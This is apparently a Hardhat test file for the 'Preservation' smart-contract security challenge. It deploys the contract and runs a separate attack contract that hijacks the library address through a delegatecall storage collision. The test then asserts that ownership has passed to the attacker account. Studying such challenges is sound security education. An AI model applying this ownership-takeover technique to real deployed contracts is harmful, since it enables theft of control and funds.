import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Preservation } from "../typechain";

describe("Preservation", function () {
  let preservation: Preservation;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    const signers = await ethers.getSigners();
    deployer = signers[0];
    attacker = signers[1];

    const LibraryContractFactory = await ethers.getContractFactory(
      "contracts/preservation/Preservation.sol:LibraryContract"
    );

    const [timeZone1LibraryAddress, timeZone2LibraryAddress] =
      await Promise.all([
        LibraryContractFactory.deploy(),
        LibraryContractFactory.deploy(),
      ]);

    const PreservationFactory = await ethers.getContractFactory(
      "contracts/preservation/Preservation.sol:Preservation",
      deployer
    );
    preservation = (await PreservationFactory.deploy(
      timeZone1LibraryAddress.address,
      timeZone2LibraryAddress.address
    )) as Preservation;
  });

  it("before attack", async () => {
    expect(await preservation.owner()).to.eq(deployer.address);
  });

  it("on attack", async function () {
    const PreservationAttackFactory = await ethers.getContractFactory(
      "contracts/preservation/PreservationAttack.sol:PreservationAttack",
      attacker
    );
    const preservationAttack = await PreservationAttackFactory.deploy();

    await preservationAttack.connect(attacker).attack(preservation.address);

    expect(await preservation.timeZone1Library()).to.eq(
      preservationAttack.address
    );
    await preservation.connect(attacker).setFirstTime(420);
  });
  it("after attack", async function () {
    expect(await preservation.owner()).to.eq(attacker.address);
  });
});
